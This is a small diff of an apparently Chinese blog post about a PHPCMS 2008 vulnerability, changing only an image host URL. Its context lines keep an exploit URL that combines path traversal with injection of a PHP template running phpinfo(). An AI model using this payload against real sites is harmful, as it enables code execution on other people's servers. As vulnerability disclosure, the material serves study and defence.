@@ -268,6 +268,6 @@ if(is_array(1)) foreach(1 AS 2 =&gt; 3) { ?&gt;&quot;,$str);
 EXP:http://localhost/yp/business/?file=../../
 admin/block&amp;action=post&amp;blockid=eval&amp;template=&lt;?php phpinfo();exit();?&gt;
 ```
-[![](http://www.creturn.com/asset/uploads/2012/07/phpcms2008.jpg "phpcms2008")](http://www.creturn.com/asset/uploads/2012/07/phpcms2008.jpg)
+[![](http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg "phpcms2008")](http://asset.creturn.com/asset/uploads/2012/07/phpcms2008.jpg)
 
 其实我觉得之前的那个注入漏洞比较严重~
